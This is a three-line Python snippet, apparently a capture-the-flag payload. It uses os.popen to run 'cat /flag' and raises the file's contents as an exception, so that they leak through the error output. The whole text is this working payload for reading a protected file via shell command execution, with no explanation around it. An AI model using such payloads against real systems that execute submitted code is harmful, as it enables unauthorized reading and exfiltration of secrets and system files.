import os
a=os.popen('cat /flag').read()
raise Exception(a)
